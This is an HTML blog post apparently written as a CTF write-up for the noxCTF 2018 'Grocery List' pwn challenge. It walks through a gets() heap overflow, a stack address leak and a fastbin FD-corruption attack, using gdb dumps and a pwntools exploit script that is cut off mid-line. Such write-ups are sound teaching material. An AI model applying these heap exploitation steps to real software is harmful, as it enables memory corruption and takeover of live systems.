@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Downloads:  GroceryList solve.py  intro1234567891011121314151617181920212223242526λ › checksec ./GroceryList[*] &amp;apos;/Challs/noxCTF/pwn/grocery_list/GroceryList&amp;apos;    Arch:     amd64-64-little">
+<meta property="og:type" content="article">
+<meta property="og:title" content="noxCTF 2018 - Grocery List">
+<meta property="og:url" content="https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/index.html">
+<meta property="og:site_name" content="Catousify">
+<meta property="og:description" content="Downloads:  GroceryList solve.py  intro1234567891011121314151617181920212223242526λ › checksec ./GroceryList[*] &amp;apos;/Challs/noxCTF/pwn/grocery_list/GroceryList&amp;apos;    Arch:     amd64-64-little">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-10-16T17:54:22.645Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="noxCTF 2018 - Grocery List">
+<meta name="twitter:description" content="Downloads:  GroceryList solve.py  intro1234567891011121314151617181920212223242526λ › checksec ./GroceryList[*] &amp;apos;/Challs/noxCTF/pwn/grocery_list/GroceryList&amp;apos;    Arch:     amd64-64-little">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/img/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/img/favicon-96x96.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>noxCTF 2018 - Grocery List</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Catousify" type="application/atom+xml" />
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/10/14/Cyber-Jawara-2018-Final-zeus/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/09/05/HackToday-2018-not-a-game/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&text=noxCTF 2018 - Grocery List"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&title=noxCTF 2018 - Grocery List"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&is_video=false&description=noxCTF 2018 - Grocery List"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=noxCTF 2018 - Grocery List&body=Check out this article: https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&title=noxCTF 2018 - Grocery List"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&title=noxCTF 2018 - Grocery List"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&title=noxCTF 2018 - Grocery List"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&title=noxCTF 2018 - Grocery List"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://zeroload.github.io/2018/09/09/noxCTF-2018-Grocery-List/&name=noxCTF 2018 - Grocery List&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#intro"><span class="toc-number">1.</span> <span class="toc-text">intro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overflow"><span class="toc-number">2.</span> <span class="toc-text">overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leak"><span class="toc-number">3.</span> <span class="toc-text">leak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-attack-forging-chunk"><span class="toc-number">4.</span> <span class="toc-text">fastbin-attack, forging-chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#full-exploit"><span class="toc-number">5.</span> <span class="toc-text">full exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">6.</span> <span class="toc-text">flag</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        noxCTF 2018 - Grocery List
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Catousify</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-09-09T08:31:34.000Z" itemprop="datePublished">2018-09-09</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>Downloads: </p>
+<p><a href="/assets/noxCTF/grocery_list/GroceryList">GroceryList</a></p>
+<p><a href="/assets/noxCTF/grocery_list/solve.py">solve.py</a></p>
+</blockquote>
+<h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">λ › checksec ./GroceryList</span><br><span class="line">[*] &apos;/Challs/noxCTF/pwn/grocery_list/GroceryList&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">λ › ./GroceryList</span><br><span class="line">Hello and welcome to the grocery List! Here you can manage the list of items you would like to buy.</span><br><span class="line">What would you like to do?</span><br><span class="line">1. Print the list</span><br><span class="line">2. Add item to the list</span><br><span class="line">3. Add empty items to the list</span><br><span class="line">4. Remove an item from the list</span><br><span class="line">5. Edit an existing item</span><br><span class="line">6. Add default example</span><br><span class="line">7. Exit</span><br><span class="line">3</span><br><span class="line">What is the size of your items?</span><br><span class="line">1. Small</span><br><span class="line">2. Medium</span><br><span class="line">3. Large</span><br><span class="line">1</span><br><span class="line">How many items would you like to add?</span><br><span class="line">1</span><br><span class="line">^C</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">I really hate it when I forget what I wanted to buy.</span><br><span class="line">That&apos;s why I created the FASTEST Grocery List in the world.</span><br><span class="line">Go check it out.</span><br><span class="line">nc chal.noxale.com 1232</span><br></pre></td></tr></table></figure>
+<p>This is like any usual heap exploitation challanges, we have <code>print</code>, <code>remove</code>, <code>edit</code>, and <code>add</code> items in/to the lists. The main loop roughly looks like this,</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> select;</span><br><span class="line"><span class="keyword">char</span> grocery_item[<span class="number">12</span>] = <span class="string">"Grocery Item"</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  puts_(<span class="string">"What would you like to do?"</span>);</span><br><span class="line">  puts_(<span class="string">"1. Print the list"</span>);</span><br><span class="line">  puts_(<span class="string">"2. Add item to the list"</span>);</span><br><span class="line">  puts_(<span class="string">"3. Add empty items to the list"</span>);</span><br><span class="line">  puts_(<span class="string">"4. Remove an item from the list"</span>);</span><br><span class="line">  puts_(<span class="string">"5. Edit an existing item"</span>);</span><br><span class="line">  puts_(<span class="string">"6. Add default example"</span>);</span><br><span class="line">  puts_(<span class="string">"7. Exit"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;select);</span><br><span class="line">  <span class="keyword">switch</span> ( select ) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      print_all();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      add_item();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      add_empty();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      delete_item();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      edit_item();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      add_default(grocery_item);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      puts_(<span class="string">"Goodbye\n"</span>);</span><br><span class="line">      free_all();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      puts_(<span class="string">"Invalid choice\n"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> ( select != <span class="number">7</span> );</span><br></pre></td></tr></table></figure>
+<p>Looks good, but we have some limitation on malloc chunk size, only FASTBIN allowed <code>small = 0x10</code>, <code>medium = 0x38</code>, and <code>large = 0x60</code>. This actually confirms the challange description <code>the FASTEST Grocery List in the world</code>, well, yes <em>FASTEST</em> bin.</p>
+<h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p>In <code>edit</code> we have overflow using <code>gets()</code>,<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">puts_(<span class="string">"Which item would you like to edit?"</span>);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;index);</span><br><span class="line"><span class="keyword">if</span> ( index &lt; <span class="number">0</span> || count &lt;= index ) &#123;</span><br><span class="line">  puts_(<span class="string">"Invalid index\n"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  puts_(<span class="string">"Enter your item`s new name: "</span>);</span><br><span class="line">  gets(ptr_list[index]);</span><br><span class="line">  item = ptr_list[v2];</span><br><span class="line">  item[<span class="built_in">strcspn</span>(ptr_list[index], <span class="string">"\n"</span>)] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><p>In <code>add_default</code>, the argument isn’t passed properly, instead of copying it’s value, it’s actually copied the pointer to grocery_item on stack. Thus, we have stack leak.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    add_default()</span><br><span class="line">    stack = u64(dump_all()[0].ljust(8, &apos;\x00&apos;))</span><br><span class="line">    log.info(&apos;stack &apos; + hex(stack))</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/10gx 0x555555554000+0x202040</span><br><span class="line">0x555555756040: 0x0000555555758430      0x0000000000000000</span><br><span class="line">0x555555756050: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555756060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555756070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">gdb-peda$ x/10gx 0x0000555555758420</span><br><span class="line">0x555555758420: 0x0000000000000000      0x0000000000000021</span><br><span class="line">0x555555758430: 0x00007fffffffeceb      0x0000000000000000</span><br><span class="line">0x555555758440: 0x0000000000000000      0x000000000001fbc1</span><br><span class="line">0x555555758450: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758460: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<h2 id="fastbin-attack-forging-chunk"><a href="#fastbin-attack-forging-chunk" class="headerlink" title="fastbin-attack, forging-chunk"></a>fastbin-attack, forging-chunk</h2><p>In simple form, we will corrupt FD pointer to trick malloc serving us a controlled pointer. We have stack address leak, so it should be good destination for this.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/10gx 0x00007fffffffecd0</span><br><span class="line">0x7fffffffecd0: 0x00000000ffffecfe      0x0000000000000021</span><br><span class="line">0x7fffffffece0: 0x00002aaaaacf3830      0x65636f7247554910</span><br><span class="line">0x7fffffffecf0: 0x006d657449207972      0x4226f8d697e7ba00</span><br><span class="line">0x7fffffffed00: 0x0000555555555380      0x00002aaaaacf3830</span><br><span class="line">0x7fffffffed10: 0x0000000000000001      0x00007fffffffede8</span><br></pre></td></tr></table></figure></p>
+<p>welp. Right off the bat, <code>0x7fffffffecd0</code> should be good enough, beacause the it passes the request size check for <code>__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)</code>.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    add_empty(1, 4)</span><br><span class="line">	remove_item(1)</span><br><span class="line">	remove_item(1)</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/20gx 0x0000555555758420</span><br><span class="line">0x555555758420: 0x0000000000000000      0x0000000000000021 &lt;- item 0</span><br><span class="line">0x555555758430: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758440: 0x0000000000000000      0x0000000000000021 &lt;- item 1, already free</span><br><span class="line">0x555555758450: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758460: 0x0000000000000000      0x0000000000000021 &lt;- item 2, free</span><br><span class="line">0x555555758470: 0x0000555555758440      0x0000000000000000 # FD</span><br><span class="line">0x555555758480: 0x0000000000000000      0x0000000000000021 &lt;- item 3</span><br><span class="line">0x555555758490: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557584a0: 0x0000000000000000      0x000000000001fb61</span><br><span class="line"></span><br><span class="line">    payload  = p64(0) * 3</span><br><span class="line">    payload += p64(0x21)</span><br><span class="line">    payload += p64(0) * 3</span><br><span class="line">    payload += p64(0x21)</span><br><span class="line">    payload += p64(stack - 0x1b)</span><br><span class="line">    edit_item(0, payload)</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/20gx 0x0000555555758420</span><br><span class="line">0x555555758420: 0x0000000000000000      0x0000000000000021 &lt;- item 0</span><br><span class="line">0x555555758430: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758440: 0x0000000000000000      0x0000000000000021 &lt;- item 1, already free</span><br><span class="line">0x555555758450: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758460: 0x0000000000000000      0x0000000000000021 &lt;- item 2, free</span><br><span class="line">0x555555758470: 0x00007fffffffecd0      0x0000000000000000 # FD corrupted</span><br><span class="line">0x555555758480: 0x0000000000000000      0x0000000000000021 &lt;- item 3</span><br></pre></td></tr></table></figure></p>
+<p>So, after this the next allocation for items should have our controlled pointer,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    add_empty(1, 2)</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/10gx 0x555555554000+0x202040</span><br><span class="line">0x555555756040: 0x0000555555758430      0x0000555555758490</span><br><span class="line">0x555555756050: 0x0000555555758470      0x00007fffffffece0 &lt;- controlled !!</span><br><span class="line">0x555555756060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555756070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555756080: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>This will eventually lead to libc leak too, since <code>0x00007fffffffece0</code> contains the address of <code>__libc_start_main+241</code>. Ok, we have overflow, controlled pointer at stack, libc leak, is it done? Well, sadly, not yet. We should bypass some more protection on binary, stack canary and this custom protection at the end of <code>main</code> function.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( *(rbp+0x8) != (void *)bss_retAddr || *(rbp-0x20) != (void *)bss_retAddr )</span><br><span class="line">    exit(1);</span><br></pre></td></tr></table></figure></p>
+<p>We can’t use overflow and <code>dump_all</code> to leak canary, because at the end of buffer null byte appended. So, from this point it’s just forging chunks and fastbin attack with different size (we still have medium and large sized fastbins to use), to leak canary, pie base, and stuff.</p>
+<p>Wonder why I’m not using <code>__malloc_hook</code> or stuff like that? Well, sadly, no satisfied offset from any one_gadget RCE, simply we can’t use <code>__malloc_hook</code> on this challanges, or is it(?).</p>
+<h2 id="full-exploit"><a href="#full-exploit" class="headerlink" title="full exploit"></a>full exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">gdbcmd = <span class="string">'''</span></span><br><span class="line"><span class="string">b *&#123;&#125;+0x1283</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = 'kitty @ new-window --keep-focus sh -c'.split()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv.__len__() == <span class="number">3</span>:</span><br><span class="line">    r = remote(sys.argv[<span class="number">1</span>], int(sys.argv[<span class="number">2</span>]))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(sys.argv[<span class="number">1</span>], aslr=<span class="keyword">False</span>, env=&#123;<span class="string">'LD_PRELOAD'</span> : <span class="string">'/home/vagrant/ctf/nox/pwn/grocery_list/libc.so'</span>&#125;)</span><br><span class="line">    <span class="comment"># r = process(sys.argv[1], aslr=False)</span></span><br><span class="line">    gdb.attach(r, gdbcmd.format(<span class="number">0x555555554000</span>))</span><br><span class="line">    <span class="comment"># r = process(sys.argv[1])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_all</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'7. Exit'</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'----------\n'</span>)</span><br><span class="line">    content = r.recvuntil(<span class="string">'\n----------'</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">    content = content.splitlines()</span><br><span class="line">    content = [x.split(<span class="string">'. '</span>)[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> content]</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_item</span><span class="params">(size, payload)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'7. Exit'</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'items?'</span>, str(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'name:'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_empty</span><span class="params">(size, count)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'7. Exit'</span>, <span class="string">'3'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'items?'</span>, str(size))</span><br><span class="line">    r.sendlineafter(<span class="string">'add?'</span>, str(count))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_item</span><span class="params">(ID)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'7. Exit'</span>, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'remove?'</span>, str(ID))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_item</span><span class="params">(ID, payload)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'7. Exit'</span>, <span class="string">'5'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'edit?'</span>, str(ID))</span><br><span class="line">    r.sendlineafter(<span class="string">'name:'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_default</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'7. Exit'</span>, <span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_exit</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'7. Exit'</span>, <span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line">add_default()</span><br><span class="line">stack = u64(dump_all()[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'stack '</span> + hex(stack))</span><br><span class="line">remove_item(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add_empty(<span class="number">1</span>, <span class="number">4</span>)</span><br><span class="line">remove_item(<span class="number">1</span>)</span><br><span class="line">remove_item(<span class="number">1</span>)</span><br><span class="line">payload  = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span 